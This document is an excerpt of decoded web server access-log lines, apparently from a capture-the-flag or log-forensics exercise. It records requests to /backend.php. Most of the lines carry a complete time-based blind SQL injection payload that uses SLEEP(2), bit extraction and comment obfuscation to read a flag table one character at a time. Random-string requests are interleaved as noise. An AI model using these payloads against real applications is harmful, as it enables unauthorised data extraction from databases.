line_no	timestamp	decoded_request
500	01/Mar/2015:13:17:29 -0500	/backend.php?user=pHIyhVlY2Z8p
501	01/Mar/2015:13:17:28 -0500	/backend.php?user=admin' AND IF(/*k3AFtS*/SUBSTRING(REVERSE(/*HluoLlvxdLN*/CONV(HEX(SUBSTRING(/*yguxF*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*OR*/),20,1)),16,2))/*ruFLiehBi*/,3,1)=1,SLEEP(2),458363452) AND '458
502	01/Mar/2015:13:17:30 -0500	/backend.php?user=admin' AND IF(/*eqmi*/SUBSTRING(REVERSE(/*n2OmgIU*/CONV(HEX(SUBSTRING(/*msw*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*9Bp6RSrT17U*/),20,1)),16,2))/*LlT2nY3*/,4,1)=1,SLEEP(2),38947343) AND '3241331
503	01/Mar/2015:13:17:30 -0500	/backend.php?user=zCq8INWlgaDBQ2nCtzhaP
504	01/Mar/2015:13:17:30 -0500	/backend.php?user=admin' AND IF(/*GTjaqaPx*/SUBSTRING(REVERSE(/*YNlYhkkEdS*/CONV(HEX(SUBSTRING(/*On*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*2u*/),20,1)),16,2))/*nnAMdJsCL*/,5,1)=1,SLEEP(2),41475219) AND '72463
505	01/Mar/2015:13:17:32 -0500	/backend.php?user=BjlBy1fMuQuMsG8LI3K3wiFghHEf5jlbjZ7ll
506	01/Mar/2015:13:17:33 -0500	/backend.php?user=rxVBzmLeulj
507	01/Mar/2015:13:17:32 -0500	/backend.php?user=admin' AND IF(/*fBKVgat*/SUBSTRING(REVERSE(/*abTy*/CONV(HEX(SUBSTRING(/*vtBf7*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Wpsjyckggv*/),20,1)),16,2))/*Ktssyu10jKx*/,6,1)=1,SLEEP(2),91956742) AND '79
508	01/Mar/2015:13:17:34 -0500	/backend.php?user=admin' AND IF(/*OQhi*/SUBSTRING(REVERSE(/*yza7BQ8M*/CONV(HEX(SUBSTRING(/*DFsszO*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*YRhE*/),20,1)),16,2))/*1M4vBDT*/,7,1)=1,SLEEP(2),22641) AND '967
509	01/Mar/2015:13:17:34 -0500	/backend.php?user=alFeSfeGwgeoThDD16gVHVz9V6u8EtOEqi70FtEF2Z5hr2
510	01/Mar/2015:13:17:35 -0500	/backend.php?user=AbtkyhL7eBa13d8PWCy27OjqLOo6kuIEzpnqO2yJIvCvOTrsB8BePdtmPOV75DgodHR0isSNrsUGSWYsljUAIj07ua
511	01/Mar/2015:13:17:34 -0500	/backend.php?user=admin' AND IF(/*7mwCSGz*/SUBSTRING(REVERSE(/*VrE1RO6WBc*/CONV(HEX(SUBSTRING(/*T2*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xIVrou*/),21,1)),16,2))/*stTXFTIOFXd*/,1,1)=1,SLEEP(2),9844) AND '7178
512	01/Mar/2015:13:17:36 -0500	/backend.php?user=admin' AND IF(/*VUdwu*/SUBSTRING(REVERSE(/*U27uGAoqZ*/CONV(HEX(SUBSTRING(/*uO2LL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xJc3dojc5V*/),21,1)),16,2))/*V8AC*/,2,1)=1,SLEEP(2),633465) AND '282381
513	01/Mar/2015:13:17:36 -0500	/backend.php?user=admin' AND IF(/*ch*/SUBSTRING(REVERSE(/*xDn60IStFP*/CONV(HEX(SUBSTRING(/*huJE4v*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*mtM8OXQRt*/),21,1)),16,2))/*2voS*/,3,1)=1,SLEEP(2),984834) AND '5666593
514	01/Mar/2015:13:17:36 -0500	/backend.php?user=xFdsPkgwfkNCdi4miIwtzxIrV2hPKjhVw2Nkmalyxr
515	01/Mar/2015:13:17:37 -0500	/backend.php?user=Go1n6R0h3kxm37kGwSAuAOliPcVD6hqVmS2v8nssLTfpQoTNTQiIIqt2D8OGEFKMHkY1
516	01/Mar/2015:13:17:36 -0500	/backend.php?user=admin' AND IF(/*Zb*/SUBSTRING(REVERSE(/*WXlJTXh*/CONV(HEX(SUBSTRING(/*PAr1Qdp3Tb0*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*LPt6*/),21,1)),16,2))/*drYLtnzS*/,4,1)=1,SLEEP(2),23218) AND '167942
517	01/Mar/2015:13:17:39 -0500	/backend.php?user=jc4lGiIMWnTuCmIbUH8K8Sj0w3zF9KniT80V4Jh0Sgqe1TIguBdLMLSFnmJaIf9H7TzSepzNVexKxvtqIzK
518	01/Mar/2015:13:17:38 -0500	/backend.php?user=admin' AND IF(/*5u5*/SUBSTRING(REVERSE(/*CC9*/CONV(HEX(SUBSTRING(/*4MYh*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*a24C*/),21,1)),16,2))/*n7S5kY0*/,5,1)=1,SLEEP(2),7653) AND '16
519	01/Mar/2015:13:17:40 -0500	/backend.php?user=m3rcR5UyDUfAqEstodFZjz6sZXeS2qVD3ywAoqcg44
520	01/Mar/2015:13:17:40 -0500	/backend.php?user=admin' AND IF(/*dB0tKyFQA*/SUBSTRING(REVERSE(/*yrWU6i*/CONV(HEX(SUBSTRING(/*Htd*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*b1iTXcibfz*/),21,1)),16,2))/*UyKbaLlv*/,6,1)=1,SLEEP(2),876115) AND '7876276
521	01/Mar/2015:13:17:42 -0500	/backend.php?user=admin' AND IF(/*l94r7kM5Wrv*/SUBSTRING(REVERSE(/*bcmaa8MaOO*/CONV(HEX(SUBSTRING(/*8E8wBk*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ILb*/),21,1)),16,2))/*wA*/,7,1)=1,SLEEP(2),67415226) AND '91
522	01/Mar/2015:13:17:42 -0500	/backend.php?user=admin' AND IF(/*4Tjp4LFbQX*/SUBSTRING(REVERSE(/*wm*/CONV(HEX(SUBSTRING(/*Uclq1*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*U1v2x0*/),22,1)),16,2))/*e8nBxvwUv8K*/,1,1)=1,SLEEP(2),65624128) AND '849284
523	01/Mar/2015:13:17:42 -0500	/backend.php?user=admin' AND IF(/*tOVm0p8x0i*/SUBSTRING(REVERSE(/*TLvw1DdK*/CONV(HEX(SUBSTRING(/*7IZUOLkt*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*iz7vOkwtEs3*/),22,1)),16,2))/*q7*/,2,1)=1,SLEEP(2),377749728) AND '282926
524	01/Mar/2015:13:17:42 -0500	/backend.php?user=admin' AND IF(/*62SmG3v*/SUBSTRING(REVERSE(/*DjtS*/CONV(HEX(SUBSTRING(/*22lvWTz3U*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jj2Y*/),22,1)),16,2))/*piWE*/,3,1)=1,SLEEP(2),813442723) AND '1353384
525	01/Mar/2015:13:17:43 -0500	/backend.php?user=LoMx0zRB8cOv
526	01/Mar/2015:13:17:42 -0500	/backend.php?user=admin' AND IF(/*JIXmNRb*/SUBSTRING(REVERSE(/*OcO0o2D*/CONV(HEX(SUBSTRING(/*otQF2kEk*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*UKlaKmVjG0j*/),22,1)),16,2))/*DY*/,4,1)=1,SLEEP(2),4813) AND '841745
527	01/Mar/2015:13:17:45 -0500	/backend.php?user=mc8Cxxxv6pjB36paIGbNlpkFBORRhT51Tf8f2Ep03naoBn
528	01/Mar/2015:13:17:46 -0500	/backend.php?user=wbJ59pwONyZrfGPVEG29oy7vizUeSrB55DHzWs4GuOInoH7bgMJkEOxg3gx02W
529	01/Mar/2015:13:17:44 -0500	/backend.php?user=admin' AND IF(/*sMi8pa*/SUBSTRING(REVERSE(/*It*/CONV(HEX(SUBSTRING(/*dpfjKHD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*9pfw*/),22,1)),16,2))/*8aXzQj*/,5,1)=1,SLEEP(2),674131) AND '692
530	01/Mar/2015:13:17:48 -0500	/backend.php?user=KEOSD2aMLUCV1nLRF3i
531	01/Mar/2015:13:17:46 -0500	/backend.php?user=admin' AND IF(/*b3Q6ROhfg*/SUBSTRING(REVERSE(/*YY6LeBb5*/CONV(HEX(SUBSTRING(/*wPd*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*XT*/),22,1)),16,2))/*GKyoFjgL46P*/,6,1)=1,SLEEP(2),412516926) AND '88982
532	01/Mar/2015:13:17:48 -0500	/backend.php?user=admin' AND IF(/*JIB8TfWvL*/SUBSTRING(REVERSE(/*z8gWC9yggG*/CONV(HEX(SUBSTRING(/*oFRKHqr*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*3Wbgw*/),22,1)),16,2))/*oZzQv*/,7,1)=1,SLEEP(2),7178) AND '4767429
533	01/Mar/2015:13:17:50 -0500	/backend.php?user=lW6dkmOIEcGEdElUDmBRFlPeiTyai6pVbw9Z
534	01/Mar/2015:13:17:48 -0500	/backend.php?user=admin' AND IF(/*TlZ0x9x9I*/SUBSTRING(REVERSE(/*ShzS3q*/CONV(HEX(SUBSTRING(/*J5yS3*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*h7wE*/),23,1)),16,2))/*qG9GWim*/,1,1)=1,SLEEP(2),16927487) AND '999124
535	01/Mar/2015:13:17:50 -0500	/backend.php?user=admin' AND IF(/*fLt98Yz*/SUBSTRING(REVERSE(/*WTlwh*/CONV(HEX(SUBSTRING(/*6MsVCvKU8L*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*pvSwxA*/),23,1)),16,2))/*auaX*/,2,1)=1,SLEEP(2),284365) AND '999
536	01/Mar/2015:13:17:50 -0500	/backend.php?user=admin' AND IF(/*X2*/SUBSTRING(REVERSE(/*gU4IfzJo*/CONV(HEX(SUBSTRING(/*HtYR*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*F3yt7pk*/),23,1)),16,2))/*5NY4*/,3,1)=1,SLEEP(2),37222784) AND '5863479
537	01/Mar/2015:13:17:51 -0500	/backend.php?user=r6ziUrhAz1GjQs7cz2rAB5lj2wGZwg7E44ArFzRNwqoPdGz2UmB3iA
538	01/Mar/2015:13:17:50 -0500	/backend.php?user=admin' AND IF(/*gqGtAb*/SUBSTRING(REVERSE(/*1kBQPO*/CONV(HEX(SUBSTRING(/*YmV*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*kt0704*/),23,1)),16,2))/*OS46kaSH7*/,4,1)=1,SLEEP(2),3353157) AND '674882
539	01/Mar/2015:13:17:52 -0500	/backend.php?user=admin' AND IF(/*ccU*/SUBSTRING(REVERSE(/*Uc*/CONV(HEX(SUBSTRING(/*f2dn6JvZ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*pB*/),23,1)),16,2))/*Ssd*/,5,1)=1,SLEEP(2),33984) AND '26
540	01/Mar/2015:13:17:52 -0500	/backend.php?user=admin' AND IF(/*FC9*/SUBSTRING(REVERSE(/*zNo7Eix*/CONV(HEX(SUBSTRING(/*9IMKPS*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*OjxVuG2*/),23,1)),16,2))/*RwK1PW6*/,6,1)=1,SLEEP(2),857855) AND '7933591
541	01/Mar/2015:13:17:53 -0500	/backend.php?user=4yEcrx6ohdbvVOVNsSEhuzhvTqKMsI4e
542	01/Mar/2015:13:17:54 -0500	/backend.php?user=K9Y2FL3B02hTtldsjejynw3czdFcFGBRWijr2nXviuBKS2VEzwNbT08qwZ
543	01/Mar/2015:13:17:52 -0500	/backend.php?user=admin' AND IF(/*OJ0pEKkts*/SUBSTRING(REVERSE(/*VXMzXjEs*/CONV(HEX(SUBSTRING(/*ySvpc5WhhLK*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Zj*/),23,1)),16,2))/*TS4VZkY*/,7,1)=1,SLEEP(2),11837) AND '7973416
544	01/Mar/2015:13:17:54 -0500	/backend.php?user=admin' AND IF(/*AubVct*/SUBSTRING(REVERSE(/*y0*/CONV(HEX(SUBSTRING(/*ptHmXUBi*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xubEeDglI8I*/),24,1)),16,2))/*ag819*/,1,1)=1,SLEEP(2),69575636) AND '863164
545	01/Mar/2015:13:17:55 -0500	/backend.php?user=C6H0OsxlxUChHCC03KoR1qPXLqFz4pUE9YXGCbTLExNaFeZUBArj2jRVYXx8RjMWnnjoBadT4
546	01/Mar/2015:13:17:54 -0500	/backend.php?user=admin' AND IF(/*5aON5KpG*/SUBSTRING(REVERSE(/*5Po9R73*/CONV(HEX(SUBSTRING(/*TL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xGVdfM*/),24,1)),16,2))/*uHOsO0*/,2,1)=1,SLEEP(2),9666878) AND '67118
547	01/Mar/2015:13:17:56 -0500	/backend.php?user=admin' AND IF(/*xn8zsExFD*/SUBSTRING(REVERSE(/*09dnOt*/CONV(HEX(SUBSTRING(/*9E*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*RzHq*/),24,1)),16,2))/*Fuf7PBlfd*/,3,1)=1,SLEEP(2),32516) AND '229
548	01/Mar/2015:13:17:56 -0500	/backend.php?user=admin' AND IF(/*CZOvO9W*/SUBSTRING(REVERSE(/*npg*/CONV(HEX(SUBSTRING(/*ReFn87D5y*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*b7ffJ*/),24,1)),16,2))/*mMCUSAT*/,4,1)=1,SLEEP(2),18166498) AND '27111
549	01/Mar/2015:13:17:57 -0500	/backend.php?user=S1v5QdlhenkOu8gpqa2ApLI7UIk760TlJYucifmKzaQpsuEAE08N4o3ugpcSvaa7K4PFEJoVUBPFFGIo
550	01/Mar/2015:13:17:58 -0500	/backend.php?user=yYMw1EPmsER9qfkB4H6ZmumYCRPLN78TqkSnQ3YAjV
551	01/Mar/2015:13:17:56 -0500	/backend.php?user=admin' AND IF(/*IXDH6M4bIm*/SUBSTRING(REVERSE(/*67T17*/CONV(HEX(SUBSTRING(/*0vwBXwxxg*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*5c*/),24,1)),16,2))/*bpUlHz9Rk1D*/,5,1)=1,SLEEP(2),713657) AND '97
552	01/Mar/2015:13:18:00 -0500	/backend.php?user=TGDj1eKORcTkhFWr1QyVgZF9QbEUUsr2Et2
553	01/Mar/2015:13:17:58 -0500	/backend.php?user=admin' AND IF(/*E0g*/SUBSTRING(REVERSE(/*86EzkVRueu*/CONV(HEX(SUBSTRING(/*0yD4wwwNj*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*m9*/),24,1)),16,2))/*NF6G*/,6,1)=1,SLEEP(2),62712) AND '373
554	01/Mar/2015:13:18:00 -0500	/backend.php?user=admin' AND IF(/*XknhK*/SUBSTRING(REVERSE(/*zsMkyW*/CONV(HEX(SUBSTRING(/*mcV247hup8f*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*alYCgHfib*/),24,1)),16,2))/*LF*/,7,1)=1,SLEEP(2),613913) AND '93
555	01/Mar/2015:13:18:01 -0500	/backend.php?user=rPDix4Ed2XTinmUW
556	01/Mar/2015:13:18:02 -0500	/backend.php?user=mhZzONi2J3PaR6O2euiEo1D53PPZpSxQHURJmJkwn3SdwPKWMpTzoGWs7UiMzO
557	01/Mar/2015:13:18:00 -0500	/backend.php?user=admin' AND IF(/*7Owm*/SUBSTRING(REVERSE(/*tao4mz5OD4*/CONV(HEX(SUBSTRING(/*F3dDsXu*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*d6oBnhp5*/),25,1)),16,2))/*YyEc*/,1,1)=1,SLEEP(2),39118718) AND '8285
558	01/Mar/2015:13:18:03 -0500	/backend.php?user=oha0KtUyAgO3gbftwV881RxWDQQUbzyDBXQOowFrOs2hD
559	01/Mar/2015:13:18:04 -0500	/backend.php?user=ko8CTuqYo4Ojl3cgrqrhAFz3FRY41smb4t2qkXRBpF6ipJFZOBZQB835n1ZzJeUfSsT
560	01/Mar/2015:13:18:02 -0500	/backend.php?user=admin' AND IF(/*lwHYcWv*/SUBSTRING(REVERSE(/*gXNrNLano75*/CONV(HEX(SUBSTRING(/*AF*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*kBg24Vn*/),25,1)),16,2))/*keLPkrtu7eR*/,2,1)=1,SLEEP(2),75311199) AND '3598
561	01/Mar/2015:13:18:06 -0500	/backend.php?user=6quEAdribAcvEYXaY2uTqfcduPGk0nt2UrNWCMuE7rh7g4xTmuTVQQd3U5qij2zMM12bxkaY
562	01/Mar/2015:13:18:04 -0500	/backend.php?user=admin' AND IF(/*hdUCL0HA01*/SUBSTRING(REVERSE(/*bMkIx*/CONV(HEX(SUBSTRING(/*1k*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*nvQpl218HeA*/),25,1)),16,2))/*KZuES68vo*/,3,1)=1,SLEEP(2),884793) AND '41
563	01/Mar/2015:13:18:06 -0500	/backend.php?user=admin' AND IF(/*b2QtmP*/SUBSTRING(REVERSE(/*LbiB*/CONV(HEX(SUBSTRING(/*zb8vDJPZn7*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*KEyNcElyFm9*/),25,1)),16,2))/*ijgl5tH7c*/,4,1)=1,SLEEP(2),654432774) AND '7251
564	01/Mar/2015:13:18:06 -0500	/backend.php?user=admin' AND IF(/*m7oKWM1Y*/SUBSTRING(REVERSE(/*k30ZWIZ3An*/CONV(HEX(SUBSTRING(/*MmzA8*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*7xXsQo*/),25,1)),16,2))/*Axjdn6*/,5,1)=1,SLEEP(2),9965) AND '478
565	01/Mar/2015:13:18:06 -0500	/backend.php?user=admin' AND IF(/*BM9kNvtsH*/SUBSTRING(REVERSE(/*io*/CONV(HEX(SUBSTRING(/*AuUZEg*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*HO21f4W1*/),25,1)),16,2))/*OSGKGzh*/,6,1)=1,SLEEP(2),156664787) AND '52649
566	01/Mar/2015:13:18:07 -0500	/backend.php?user=sISotBU9xiJaEki4QcNWjTbHNsXfnHMT
567	01/Mar/2015:13:18:08 -0500	/backend.php?user=kuNI7ALMmEJ2GOxnbMggsX8fAza8dlY8KFmy5ZoBhIsqVKs4UD3gb1FQctYImC58YLfBktBlDth5P
568	01/Mar/2015:13:18:06 -0500	/backend.php?user=admin' AND IF(/*nNmnC82B*/SUBSTRING(REVERSE(/*DDC19*/CONV(HEX(SUBSTRING(/*jhAsB1GH*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*8dB3*/),25,1)),16,2))/*CQuypGZV*/,7,1)=1,SLEEP(2),1973) AND '918424
569	01/Mar/2015:13:18:10 -0500	/backend.php?user=P0IY62oN4F3UpG1Arm39O58vrtyaBCZ8P5bS5qPTq24LYP2BDpMCCPoOlITZTxmNHeqAIXdLQN
570	01/Mar/2015:13:18:08 -0500	/backend.php?user=admin' AND IF(/*GygYG*/SUBSTRING(REVERSE(/*ZMSD4oNn*/CONV(HEX(SUBSTRING(/*1E5yRbX*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*xOt*/),26,1)),16,2))/*6i3fQinhdA*/,1,1)=1,SLEEP(2),518141) AND '9522
571	01/Mar/2015:13:18:10 -0500	/backend.php?user=admin' AND IF(/*SR*/SUBSTRING(REVERSE(/*Gzmo*/CONV(HEX(SUBSTRING(/*cOI10Ur*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*QZ*/),26,1)),16,2))/*6VZq*/,2,1)=1,SLEEP(2),721968) AND '27588
572	01/Mar/2015:13:18:10 -0500	/backend.php?user=admin' AND IF(/*IOYrGiRPv*/SUBSTRING(REVERSE(/*muaOe8HUJ*/CONV(HEX(SUBSTRING(/*JRovCTwF*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Dt0YgOf*/),26,1)),16,2))/*JNnF3QD1j*/,3,1)=1,SLEEP(2),8725234) AND '4445215
573	01/Mar/2015:13:18:12 -0500	/backend.php?user=OvFkklApSKS4
574	01/Mar/2015:13:18:10 -0500	/backend.php?user=admin' AND IF(/*15KHI5F*/SUBSTRING(REVERSE(/*z4pVpzYK*/CONV(HEX(SUBSTRING(/*4BkNjZMY*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*68Lhy6VUx*/),26,1)),16,2))/*Rb419BnKD*/,4,1)=1,SLEEP(2),436797) AND '94956
575	01/Mar/2015:13:18:14 -0500	/backend.php?user=XTWbe0O6eRgC4woi76iAxytWNZiWIZKD3DfuBliokY
576	01/Mar/2015:13:18:12 -0500	/backend.php?user=admin' AND IF(/*rfDaG*/SUBSTRING(REVERSE(/*anB5*/CONV(HEX(SUBSTRING(/*exrPr2Q7oF*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*utw7WBFSAj*/),26,1)),16,2))/*Z55H96u*/,5,1)=1,SLEEP(2),427649) AND '892
577	01/Mar/2015:13:18:16 -0500	/backend.php?user=AaE04wUjvSXgBVpXp5DdCFjh2KNmrO9mpZusmu
578	01/Mar/2015:13:18:14 -0500	/backend.php?user=admin' AND IF(/*0HYrkRZ3V*/SUBSTRING(REVERSE(/*lyFreu*/CONV(HEX(SUBSTRING(/*TVLZCJBz4*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*tP7R6u11*/),26,1)),16,2))/*YXN1wiTiq7*/,6,1)=1,SLEEP(2),1396) AND '243844
579	01/Mar/2015:13:18:16 -0500	/backend.php?user=admin' AND IF(/*xhL7z9p*/SUBSTRING(REVERSE(/*PYr8Hlh3k*/CONV(HEX(SUBSTRING(/*7UBaoQqZeZ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*LbFfArz*/),26,1)),16,2))/*VKpVy1ipUE*/,7,1)=1,SLEEP(2),57846531) AND '4315598
580	01/Mar/2015:13:18:16 -0500	/backend.php?user=admin' AND IF(/*9cxk*/SUBSTRING(REVERSE(/*EE7rIet*/CONV(HEX(SUBSTRING(/*9VhdNqzETw*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*o2W6*/),27,1)),16,2))/*FTu0*/,1,1)=1,SLEEP(2),421592142) AND '1958795
581	01/Mar/2015:13:18:18 -0500	/backend.php?user=w4WJ1fnMuzlDjotpe9zhQlUMRO0k3GY2Wvz23juT4RLLH9bpaiMsTJU4SK7y9SHB9bE
582	01/Mar/2015:13:18:16 -0500	/backend.php?user=admin' AND IF(/*m8wTOK4SkUA*/SUBSTRING(REVERSE(/*41*/CONV(HEX(SUBSTRING(/*3mL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Hms*/),27,1)),16,2))/*GDgbvJvEboP*/,2,1)=1,SLEEP(2),336619688) AND '124
583	01/Mar/2015:13:18:18 -0500	/backend.php?user=admin' AND IF(/*BL2ovlr*/SUBSTRING(REVERSE(/*R3BNqUV*/CONV(HEX(SUBSTRING(/*o1*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*8CsYVRydqvY*/),27,1)),16,2))/*l20*/,3,1)=1,SLEEP(2),175955938) AND '8245
584	01/Mar/2015:13:18:18 -0500	/backend.php?user=admin' AND IF(/*jL*/SUBSTRING(REVERSE(/*aJT*/CONV(HEX(SUBSTRING(/*2tx2q*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*886WFgo5UV8*/),27,1)),16,2))/*MK4EkYVQgXe*/,4,1)=1,SLEEP(2),75347527) AND '89466
585	01/Mar/2015:13:18:20 -0500	/backend.php?user=HjDLTM9cjJi59EfEThMkn3g23MuQHppRkQipgpeLjPPg0sd6hkOtYJoDQekLiV4zhdsVnm9LgLLxjXceb5zsOkwaK9
586	01/Mar/2015:13:18:18 -0500	/backend.php?user=admin' AND IF(/*vlg8MOise*/SUBSTRING(REVERSE(/*4pp0kxmGnG*/CONV(HEX(SUBSTRING(/*Zugj*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*GLA*/),27,1)),16,2))/*te*/,5,1)=1,SLEEP(2),26925278) AND '5682415
587	01/Mar/2015:13:18:21 -0500	/backend.php?user=IIZZwQEWrAySVPuuMSyiLCWaWJVWfk7wHAGJNXB0wN0lzOpI13FBJaplkvbb4p9AqZSwsISuroghjL
588	01/Mar/2015:13:18:20 -0500	/backend.php?user=admin' AND IF(/*lpGVS*/SUBSTRING(REVERSE(/*0nqOr*/CONV(HEX(SUBSTRING(/*m3Nne8*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ioh14*/),27,1)),16,2))/*JDufRg*/,6,1)=1,SLEEP(2),181799362) AND '72236
589	01/Mar/2015:13:18:22 -0500	/backend.php?user=admin' AND IF(/*mAb*/SUBSTRING(REVERSE(/*u6K7aI*/CONV(HEX(SUBSTRING(/*JSHbsU*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*oYPGI0N*/),27,1)),16,2))/*3SpeA*/,7,1)=1,SLEEP(2),782851) AND '242277
590	01/Mar/2015:13:18:23 -0500	/backend.php?user=AviOqgQIOULk6qUDmQTAJJDFVDdRIepxbMSD15oA6ji69pbkhphAqExCTl8lxkmhq
591	01/Mar/2015:13:18:22 -0500	/backend.php?user=admin' AND IF(/*iP2WK*/SUBSTRING(REVERSE(/*ffu*/CONV(HEX(SUBSTRING(/*b1Ta*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jWI45kjFFl*/),28,1)),16,2))/*Wpa2z*/,1,1)=1,SLEEP(2),6631) AND '2791993
592	01/Mar/2015:13:18:24 -0500	/backend.php?user=admin' AND IF(/*j2*/SUBSTRING(REVERSE(/*mewVrr*/CONV(HEX(SUBSTRING(/*DL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*IAMAN9*/),28,1)),16,2))/*gKlot3O*/,2,1)=1,SLEEP(2),787827) AND '44
593	01/Mar/2015:13:18:24 -0500	/backend.php?user=admin' AND IF(/*MylUb60TTMa*/SUBSTRING(REVERSE(/*0Y9*/CONV(HEX(SUBSTRING(/*n4*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*DBfAF*/),28,1)),16,2))/*c5JnQoJlgY*/,3,1)=1,SLEEP(2),617566975) AND '5345
594	01/Mar/2015:13:18:24 -0500	/backend.php?user=admin' AND IF(/*pUDXVd5O*/SUBSTRING(REVERSE(/*kQmczdXKF*/CONV(HEX(SUBSTRING(/*3Y*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*KvCyA*/),28,1)),16,2))/*c8FO5*/,4,1)=1,SLEEP(2),4221118) AND '366
595	01/Mar/2015:13:18:25 -0500	/backend.php?user=OTLXed6kIVXoO5ZwCGqkcF7XSulLQOaU4RARZes3hYI4gdt5HXBC
596	01/Mar/2015:13:18:26 -0500	/backend.php?user=E510I4958zDcD55n1BV8YZHoZdwqzU3segcL6vdV
